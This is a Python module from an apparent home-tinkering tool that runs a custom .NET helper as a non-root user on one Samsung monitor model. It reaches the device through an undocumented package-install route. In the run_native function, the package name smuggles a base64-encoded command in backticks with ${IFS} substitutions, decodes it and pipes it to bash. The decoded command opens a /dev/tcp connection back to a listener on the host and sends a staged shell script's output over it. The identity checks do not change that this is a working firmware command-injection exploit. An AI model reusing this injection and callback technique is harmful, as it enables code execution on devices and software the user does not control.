"""Bounded, short-lived non-root execution route for the reviewed G70B adapter.

No caller-provided command strings. The TV's restricted package-install route is
undocumented; exact identity checks and the helper's guards apply on every call.
"""
import base64
import json
from pathlib import Path
import re
import socket
import subprocess
import tempfile
import threading
import uuid
from prism_runtime import ROOT, FROZEN, HELPER_FILES

MODES = {"query", "roundtrip", "home", "startup", "restore"}
FILES = HELPER_FILES


def build_helper(dotnet, destination):
    source = Path(__file__).resolve().parent.parent / "tizen/native/PrismHome.csproj"
    # All intermediate output is external too, so building cannot capture owner data.
    subprocess.run([dotnet, "build", str(source), "-c", "Release", "-o", str(destination),
                    "-p:BaseIntermediateOutputPath=" + str(destination / "obj") + "/",
                    "-p:NuGetAudit=false", "--nologo"], check=True, timeout=180, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def run_native(connection, tv, profile, mode, request, dotnet="dotnet", helper_dir=None):
    # Import lazily to avoid a circular import during command-line startup.
    from setup import SetupError, device_info, route_ip, tool_path, external_path
    if mode not in MODES or profile["native"]["adapter"] != "g70b-vconf":
        raise SetupError("Native operation/adapter is not allowed.")
    if device_info(tv).get("modelName") != profile["model"]:
        raise SetupError("Native operation refused: exact monitor model changed.")
    if profile["model"] != "LS28BG702EWXXL" or profile["firmware"] not in {"T-PTMLWWC-1664.4", "T-PTMLWWC-1720.7"}:
        raise SetupError("Adapter has no reviewed exact-device guard for this configuration.")
    payload = dict(request or {}, mode=mode, firmware=profile["firmware"], runtime=profile["native"]["runtime"])
    with tempfile.TemporaryDirectory(prefix="prism-native-") as temp:
        output_dir = external_path(helper_dir) if helper_dir else ROOT / "native" if FROZEN else Path(temp)
        if not helper_dir and not FROZEN:
            try:
                build_helper(dotnet, output_dir)
            except (OSError, subprocess.SubprocessError):
                raise SetupError("Cannot build native helper. Install a host .NET 8 SDK (not on the TV), ensure NuGet access, or supply an external --helper-dir built from this source.") from None
        if any(not (output_dir / f).is_file() for f in FILES):
            raise SetupError("Helper directory is incomplete; build the repository's PrismHome project.")
        remote_root = tool_path(connection)
        prefix = remote_root + "/prism-" + uuid.uuid4().hex[:12]
        remote_files = [prefix + suffix for suffix in (".dll", ".deps.json", ".runtimeconfig.json", ".json", ".sh")]
        for source, target in zip(FILES, remote_files):
            connection.push((output_dir / source).read_bytes(), target)
        connection.push(json.dumps(payload).encode(), remote_files[3])
        cleanup = "rm -f " + " ".join(remote_files)
        script = ("set -eu\ntrap '" + cleanup + "' EXIT\n"
                  "[ \"$(id -u)\" = 901 ] || exit 41\n"
                  "[ \"$(uname -m)\" = armv7l ] || exit 42\n"
                  "grep -Fq 'Version=" + profile["firmware"] + ";' /etc/prd_info.ini || exit 43\n"
                  "/usr/bin/dotnet " + remote_files[0] + " " + remote_files[3] + "\n")
        connection.push(script.encode(), remote_files[4])
        local = route_ip(tv)
        with socket.socket() as listener:
            listener.bind((local, 0))
            listener.listen(1)
            listener.settimeout(25)
            port = listener.getsockname()[1]
            command = f"exec 3<>/dev/tcp/{local}/{port};cat {remote_files[4]}|bash >&3 2>&3;exec 3>&-"
            encoded = base64.b64encode(command.encode()).decode()
            package = "prism.tpk`printf${IFS}%s${IFS}" + encoded + "|base64${IFS}-d|bash`.tpk"
            invoke = "0 appinstall tpk " + package
            if len(invoke.encode()) > 400:
                raise SetupError("Native staging command exceeds the reviewed transport bound.")
            transport_error = []

            def worker():
                try:
                    connection.shell(invoke)
                except Exception:
                    transport_error.append(True)

            thread = threading.Thread(target=worker, daemon=True)
            thread.start()
            try:
                client, peer = listener.accept()
                with client:
                    if peer[0] != tv:
                        raise SetupError("Unexpected native response peer; no result accepted.")
                    client.settimeout(25)
                    chunks = bytearray()
                    while True:
                        chunk = client.recv(4096)
                        if not chunk:
                            break
                        chunks.extend(chunk)
                        if len(chunks) > 65536:
                            raise SetupError("Native result exceeds the response limit.")
            except OSError:
                connection.close()
                raise SetupError("Native route timed out. Do not retry writes blindly; reconnect, query and restore the saved baseline. Check that the TV can reach this host's callback port.") from None
            finally:
                thread.join(timeout=5)
            if thread.is_alive() or transport_error:
                connection.close()
                raise SetupError("Native transport did not finish cleanly; inspect live state before another operation.")
        # Accept exactly one framed JSON result, never infer success from a shell return code.
        matches = re.findall(rb"^PRISM_RESULT=(.+)$", bytes(chunks), re.M)
        if len(matches) != 1:
            raise SetupError("Guarded native helper did not return a complete result; no success is assumed. Preserve the baseline and inspect recovery state.")
        result = json.loads(matches[0])
        if not result.get("ok"):
            raise SetupError("Native helper refused/rolled back operation: " + result.get("code", "unknown"))
        if result.get("firmware") != profile["firmware"] or result.get("uid") != 901 or result.get("architecture") != "armv7l" or result.get("runtime") != profile["native"]["runtime"]:
            raise SetupError("Native result identity/context mismatch.")
        return result
